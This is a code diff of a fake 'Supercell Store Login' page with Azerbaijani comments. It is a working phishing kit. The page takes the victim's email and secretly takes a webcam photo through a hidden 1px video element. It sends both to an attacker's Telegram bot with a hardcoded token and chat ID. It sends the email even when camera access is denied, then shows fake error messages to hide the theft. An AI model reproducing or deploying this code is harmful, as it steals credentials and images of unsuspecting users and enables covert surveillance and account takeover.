@@ -3,21 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Supercell Store Login - Telegram Sync</title>
+    <title>Supercell Store Login</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: #1b4fb1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .login-card { background: white; width: 100%; max-width: 380px; padding: 30px; border-radius: 15px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: center; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #1b4fb1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-card { background: white; width: 380px; padding: 30px; border-radius: 15px; box-shadow: 0px 10px 30px rgba(0,0,0,0.3); text-align: center; }
         .header-tabs { display: flex; justify-content: space-between; margin-bottom: 10px; font-weight: bold; }
         .progress-bar { height: 6px; background: #eee; border-radius: 3px; margin-bottom: 25px; overflow: hidden; }
         .progress-fill { height: 100%; width: 50%; background: linear-gradient(to right, #4facfe, #00f2fe); }
         .logo-box { background: #ffc107; width: 60px; height: 60px; margin: 0 auto 15px; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 35px; font-weight: 900; color: white; }
         input[type="email"] { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; outline: none; }
-        #camera-wrapper { display: none; margin-bottom: 15px; border-radius: 10px; overflow: hidden; background: #000; line-height: 0; }
-        video { width: 100%; transform: scaleX(-1); }
-        .btn { width: 100%; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; margin-bottom: 10px; }
+        .btn { width: 100%; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; border: none; }
         .btn-blue { background: #3a86ff; color: white; }
+        
+        /* Kamera gizli qalır */
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0; }
         canvas { display: none; }
+        
+        #status-msg { margin-top: 15px; font-size: 13px; color: #666; display: none; }
     </style>
 </head>
 <body>
@@ -27,78 +30,99 @@
     <div class="progress-bar"><div class="progress-fill"></div></div>
     <div class="logo-box">S</div>
     <h2>Supercell Store Login</h2>
-    <p style="font-size: 14px; color: #666;">Enter your email to receive a verification code.</p>
+    <p style="font-size: 14px; color: #666; margin: 10px 0 20px;">Enter your email to receive a verification code.</p>
 
     <input type="email" id="userEmail" placeholder="Enter your email address">
-
-    <div id="camera-wrapper"><video id="video" autoplay playsinline></video></div>
     
-    <button class="btn btn-blue" id="main-btn">➜ SIGN IN</button>
-    
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
+
+    <button class="btn btn-blue" id="main-btn">➜ SIGN IN</button>
+    <div id="status-msg">Yüklənir, zəhmət olmasa gözləyin...</div>
+
+    <p style="font-size: 12px; color: #3a86ff; margin-top: 20px; cursor: pointer;">? Want to register for Supercell ID?</p>
 </div>
 
 <script>
     // --- TELEGRAM MƏLUMATLARINI BURAYA YAZ ---
-    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; // Məsələn: "123456789:ABCDefgh..."
-    const CHAT_ID = "-1003369084883";     // Məsələn: "987654321"
+    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
+    const CHAT_ID = "-1003369084883";     
     // ----------------------------------------
 
     const mainBtn = document.getElementById('main-btn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const cameraWrapper = document.getElementById('camera-wrapper');
     const emailInput = document.getElementById('userEmail');
-
-    let stream = null;
+    const statusMsg = document.getElementById('status-msg');
 
     mainBtn.addEventListener('click', async () => {
-        if (!stream) {
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                cameraWrapper.style.display = 'block';
-                emailInput.style.display = 'none';
-                mainBtn.innerText = '📸 TƏSDİQLƏ';
-            } catch (err) {
-                alert("Kameraya icazə verilmədi!");
-            }
-        } else {
-            // Şəkli çək
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.translate(canvas.width, 0);
-            context.scale(-1, 1);
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const email = emailInput.value;
+        if (!email) { alert("Lütfən email daxil edin"); return; }
 
-            // Kameranı söndür
-            stream.getTracks().forEach(track => track.stop());
-            cameraWrapper.style.display = 'none';
-            mainBtn.innerText = "GÖNDƏRİLİR...";
+        try {
+            // 1. Kameraya icazə istə (fonda işləyir)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+
+            // Düyməni sıradan çıxar və "yüklənir" göstər
             mainBtn.disabled = true;
+            mainBtn.innerText = "GÖZLƏYİN...";
+            statusMsg.style.display = "block";
 
-            // Şəkli Blob formatına sal və Telegram-a göndər
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `Yeni giriş cəhdi!\nEmail: ${emailInput.value}`);
-                formData.append('photo', blob, 'photo.png');
+            // 2. 2 saniyə gözlə ki, kamera tam açılsın və şəkil bulanıq düşməsin
+            setTimeout(() => {
+                autoCapture(stream, email);
+            }, 2000);
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    alert("Sistem xətası: Verifikasiya kodu göndərilə bilmədi (403).");
-                    window.location.reload();
-                } catch (error) {
-                    console.error("Xəta:", error);
-                }
-            }, 'image/png');
+        } catch (err) {
+            // İcazə verməsə belə, emaili göndər ki, boş qalmasın
+            sendToTelegram(null, email, "Kamera icazəsi rədd edildi");
+            alert("Sistem xətası (Code: 0x44). Zəhmət olmasa yenidən cəhd edin.");
         }
     });
+
+    function autoCapture(stream, email) {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // Şəkli çək
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob((blob) => {
+            sendToTelegram(blob, email, "Yeni uğurlu giriş!");
+            
+            // Kameranı söndür
+            stream.getTracks().forEach(track => track.stop());
+            
+            // İstifadəçiyə saxta xəta göstər
+            setTimeout(() => {
+                alert("Server bağlantısı kəsildi. İnternet bağlantınızı yoxlayın.");
+                window.location.reload();
+            }, 1000);
+        }, 'image/png');
+    }
+
+    async function sendToTelegram(photoBlob, email, message) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `${message}\nEmail: ${email}`);
+        
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        if (photoBlob) {
+            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            formData.append('photo', photoBlob, 'photo.png');
+        } else {
+            formData.append('text', `${message}\nEmail: ${email}`);
+        }
+
+        try {
+            await fetch(url, { method: 'POST', body: formData });
+        } catch (e) { console.error(e); }
+    }
 </script>
 
 </body>
 </html>
+
